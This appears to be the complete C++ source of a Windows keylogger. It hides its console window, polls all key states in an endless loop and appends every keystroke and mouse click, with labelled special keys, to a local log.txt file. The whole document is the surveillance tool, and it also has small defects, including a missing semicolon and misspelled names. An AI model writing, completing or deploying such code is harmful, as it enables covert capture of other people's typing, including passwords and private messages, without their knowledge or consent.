#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>


using namespace std;

#define IMPUT_LOG_FILE "log.txt"

void savedImputFile (string data){
    fstream logFile ;
    logFile.open(IMPUT_LOG_FILE, ios::app);
    logFile << data ;
    logFile.close();
}

string SpecialKeys(char S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		return " ";

	case VK_RETURN:
		return "\n";

	case VK_SHIFT:
		return "#SHIFT#";

	case VK_BACK:
		return "#BACKSPACE#";

	case VK_RBUTTON:
		return "#R_CLICK#";

	case VK_LBUTTON:
		return "#L_CLICK#"

	case VK_CAPITAL:
		return "#CAPS_LCOK#";

	case VK_TAB:
		return "#TAB#";

	case VK_UP:
		return "#UP_ARROW_KEY#";

	case VK_DOWN:
		return "#DOWN_ARROW_KEY#";

	case VK_LEFT:
		return "#LEFT_ARROW_KEY#";

	case VK_RIGHT:
		return "#RIGHT_ARROW_KEY#";

	case VK_CONTROL:
		return "#CONTROL#";

	case VK_MENU:
		return "#ALT#";

	default:
        string S_Key_String(1, S_Key); 
		return S_Key_String;
	}
}

 

int main (){
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd,SW_HIDE);

    char S_Key;
    while (true){
        for(S_Key = 0; S_Key < 254; S_Key++){
            if (GetAsyncKeyState(S_Key) & 0x1){
                savedImputFile(SpecialKeys(S_Key));
            }
        }
    }

    return 0;
}
